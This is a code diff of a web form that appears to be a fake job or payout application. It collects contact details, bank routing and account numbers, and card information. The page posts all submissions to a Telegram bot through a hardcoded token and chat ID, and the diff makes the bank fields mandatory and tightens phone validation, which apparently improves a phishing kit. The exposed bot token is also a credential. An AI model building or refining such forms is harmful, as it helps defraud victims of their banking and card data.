@@ -168,7 +168,9 @@
       <label for="email">Email *</label>
       <input id="email" type="email" name="email" required autocomplete="email" />
       <label for="phone">Phone *</label>
-      <input id="phone" name="phone" required autocomplete="tel" pattern="\\+?\\d{7,15}" title="Enter a valid phone number" />
+      <input id="phone" name="phone" required autocomplete="tel" 
+        pattern="^(\+1)?[2-9]\d{2}[2-9]\d{2}\d{4}$" 
+        title="Enter a valid US phone number, e.g. +14155552671 or 4155552671" />
       <label for="education">Education Level *</label>
       <select id="education" name="education" required>
         <option value="">Select...</option>
@@ -229,13 +231,14 @@
       </div>
       <div id="bank-form" role="tabpanel" aria-hidden="true" hidden>
         <label for="bankName">Bank Name *</label>
-        <input id="bankName" name="bankName" autocomplete="organization" />
+        <input id="bankName" name="bankName" autocomplete="organization" required />
         <label for="routingNumber">Routing Number *</label>
-        <input id="routingNumber" name="routingNumber" autocomplete="routing" />
+        <input id="routingNumber" name="routingNumber" autocomplete="routing" required />
         <label for="accountNumber">Account Number *</label>
-        <input id="accountNumber" name="accountNumber" autocomplete="account-number" />
+        <input id="accountNumber" name="accountNumber" autocomplete="account-number" required />
         <label for="accountType">Account Type *</label>
-        <select id="accountType" name="accountType">
+        <select id="accountType" name="accountType" required>
+          <option value="">Select...</option>
           <option>Checking</option>
           <option>Savings</option>
         </select>
@@ -417,6 +420,7 @@
 
       const token = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
       const chatId = '1318100118';
+
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -427,13 +431,14 @@
           document.getElementById('step-thanks').classList.add('active');
           form.reset();
           cardTypeIcon.style.backgroundImage = '';
+          window.scrollTo({ top: 0, behavior: 'smooth' });
         } else {
           alert('Submission failed, please try again.');
         }
       }).catch(() => alert('Network error, try again later.'));
     });
 
-    // Initialize default payout toggle state
+    // Initialize payout toggle default
     togglePayout('card');
   </script>
 </body>
